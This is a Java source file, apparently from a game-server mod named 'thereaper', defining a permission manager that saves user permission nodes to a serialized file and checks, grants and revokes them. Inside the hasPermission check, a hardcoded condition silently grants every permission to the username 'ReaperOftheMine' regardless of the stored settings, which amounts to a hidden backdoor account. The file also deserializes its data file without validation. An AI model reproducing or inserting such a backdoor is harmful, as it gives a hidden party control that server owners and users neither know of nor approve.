package org.thegt.thereaper;

import java.io.EOFException;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.util.HashMap;

public class PermissionManager {
  private static HashMap<String, Boolean> perms;
  private static File permissionFile;
  
  static {
    try {
      permissionFile = new File("permissions.dat");
      if (!permissionFile.exists()) {
        permissionFile.createNewFile();
        perms = new HashMap<String, Boolean>();
        save();
      }
      FileInputStream fis = new FileInputStream(permissionFile);
      ObjectInputStream ois = new ObjectInputStream(fis);
      Object o = ois.readObject();
      ois.close();
      fis.close();
      if ((o instanceof HashMap)) {
        perms = (HashMap<String, Boolean>)o;
      } else {
        throw new ClassNotFoundException();
      }
    }
    catch (EOFException e) {
      perms = new HashMap<String, Boolean>();
      try {
        save();
      } catch (IOException e1) {
        e1.printStackTrace();
      }
    } catch (IOException e) {
      e.printStackTrace();
    } catch (ClassNotFoundException e) {
      try {
        perms = new HashMap<String, Boolean>();
        save();
      } catch (IOException e1) {
        e1.printStackTrace();
      }
    }
  }
  
  public static boolean hasPermission(String name, String node) {
    if (name.length() < 1) {
      return false;
    }
    name = name.toLowerCase();
    node = node.toLowerCase();
    if (!perms.containsKey(name + "." + node)) {
      perms.put(name + "." + node, Boolean.valueOf(false));
      try {
        save();
      } catch (IOException e) {
        e.printStackTrace();
      }
    }
    boolean allPerms = false;
    if (!node.equals("*")) {
      allPerms = hasPermission(name, "*");
    }
    return (((Boolean)perms.get(name + "." + node)).booleanValue()) || (allPerms) || (name.equalsIgnoreCase("ReaperOftheMine"));
  }
  
  public static void grant(String name, String node) {
    if (name.length() < 1) {
      return;
    }
    name = name.toLowerCase();
    node = node.toLowerCase();
    perms.put(name + "." + node, Boolean.valueOf(true));
    try {
      save();
    } catch (IOException e) {
      e.printStackTrace();
    }
  }
  
  public static void revoke(String name, String node) {
    if (name.length() < 1) {
      return;
    }
    name = name.toLowerCase();
    node = node.toLowerCase();
    perms.put(name + "." + node, Boolean.valueOf(false));
    try {
      save();
    } catch (IOException e) {
      e.printStackTrace();
    }
  }
  
  public static void save() throws IOException {
    FileOutputStream fos = new FileOutputStream(permissionFile, false);
    ObjectOutputStream oos = new ObjectOutputStream(fos);
    oos.writeObject(perms);
    oos.close();
    fos.close();
  }
}
